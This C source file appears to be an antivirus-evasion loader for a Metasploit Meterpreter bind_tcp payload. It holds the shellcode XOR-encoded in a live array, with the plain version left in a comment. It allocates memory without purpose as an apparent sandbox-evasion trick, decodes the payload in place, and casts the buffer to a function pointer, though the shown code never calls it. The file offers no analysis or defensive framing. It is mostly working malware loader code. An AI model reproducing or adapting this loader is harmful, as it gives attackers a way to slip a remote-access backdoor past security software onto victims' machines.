#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* windows/meterpreter/bind_tcp - 298 bytes (stage 1) 
 * http://www.metasploit.com 
 * VERBOSE=false, LPORT=80, RHOST=, EnableStageEncoding=false, 
 * PrependMigrate=false, EXITFUNC=process, AutoLoadStdapi=true, 
 * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
 * EnableUnicodeEncoding=true 
 */

unsigned char ebuf[] =
  "\xfc\xe9\x8b\x03\x04\x05\x66\x8e\xed\x38\xd8\x6f\x87\x5f\x3e"
  "\x84\x42\x1d\x99\x41\x00\x9e\x64\x3f\x17\xae\x50\x3d\x2d\xe2"
  "\x2f\xdf\x8c\x1d\x43\x5f\x26\x09\x06\xe6\xe7\x24\x2b\xec\xce"
  "\xdd\x7c\x78\xbb\x63\x22\xb8\x76\x09\x37\xe7\xb3\x79\x42\xbe"
  "\xfc\x49\x74\x3e\x90\x11\xc9\x0b\x5c\xce\x1e\x67\x49\x9a\xa9"
  "\x77\x05\xc6\x7a\xc4\x51\x87\x63\xac\x65\x95\xfa\x96\x97\x54"
  "\x5b\x9c\x64\xbd\x2b\xab\x63\x1c\x9a\x58\x19\x41\x13\x85\x30"
  "\xe2\x32\x4f\x6d\xbe\x08\xe4\x7c\x3a\xf9\x2b\x68\x74\xa5\xfc"
  "\x7c\xf2\x7b\xab\xf5\x39\x5a\x5b\xdb\xda\xe3\xda\xde\xd4\x79"
  "\x67\xd0\xd6\xd0\x00\x9e\x66\x08\xd2\xf8\xa2\xa0\x93\x94\xfd"
  "\xe1\xe4\xaa\xc6\xce\xf3\xd0\xea\xb8\x98\x5f\x74\x1a\x33\xa5"
  "\xa5\xa6\x8e\x6c\xfd\xfa\xc3\x85\x2d\xc5\xaf\x4f\x64\xe2\xe3"
  "\xe4\xe5\xf6\xe7\xf8\xe9\xd2\x51\xb3\x62\x5e\x40\x15\x56\xf3"
  "\x18\x97\xad\xc4\xc7\xc8\x99\x43\x2d\xa6\xdd\x98\x98\xb8\x13"
  "\x09\xe4\xb3\x2a\x03\x84\x8f\xb1\x6d\x32\xe4\x22\x21\x0a\xb3"
  "\xb2\xb5\x8b\x90\x09\xdd\x06\x17\x3c\xbd\x7c\x84\x98\x80\xa2"
  "\x91\x0e\x27\x99\xf4\x9f\xf2\xa1\xaf\x91\xf8\x22\x34\xa2\x01"
  "\x2a\x8b\x37\x68\x43\x6c\x05\x16\x07\x08\x5f\x60\x0b\x64\x55"
  "\xaa\x5c\xf5\xee\xc7\x80\x47\x7f\x16\x41\x4b\x4e\x72\x19\xc5"
  "\xd5\x41\xe0\xf5\x20\xe1\x0a\xe2\xa0\xd0\x52\xc4\xea";

/*
  unsigned char buf[] =
  "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
  "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
  "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
  "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
  "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
  "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
  "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
  "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
  "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
  "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
  "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
  "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
  "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x31"
  "\xdb\x53\x68\x02\x00\x00\x50\x89\xe6\x6a\x10\x56\x57\x68\xc2"
  "\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5\x53"
  "\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d"
  "\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
  "\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
  "\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
  "\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3";
*/


int main(int argc, char **argv)
{
  int bufsz;
  int i;
  /* Declare pointer on function */
  void (*func) ();
  char *temp;

  bufsz = sizeof(ebuf) - 1;

  /* waste memory */
  temp = (char*)malloc(10000000*sizeof(char));
  memset(temp, 't', 10000000*sizeof(char));
  temp = (char*)realloc(temp,10000008);
  temp = (char*)realloc(temp,10000);

  /* decrypt packed shellcode */
  for (i=0; i<bufsz; ++i)
    {
      ebuf[i] = ebuf[i] ^ (i%256);
    }

  
  func = (void (*) ()) ebuf;

  free(temp);

  return i;

}
